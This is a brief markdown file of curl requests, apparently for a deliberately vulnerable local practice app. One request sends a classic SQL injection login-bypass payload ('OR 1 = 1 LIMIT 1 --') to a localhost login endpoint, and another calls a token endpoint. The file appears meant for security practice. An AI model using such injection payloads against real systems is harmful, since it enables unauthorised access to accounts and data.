# Vulerability Engine Curls

## Login api with sql injection

```curl
curl --location 'http://localhost:3000/login' \
--header 'Content-Type: application/json' \
--data '{
    "username": "temp'\'' OR 1 = 1 LIMIT 1 --",
    "password": "prince123"
}'
```

## Generate token with proper authentication

```curl
curl --location 'http://localhost:3000/generatetoken?token=<VALID_TOKEN>'
```
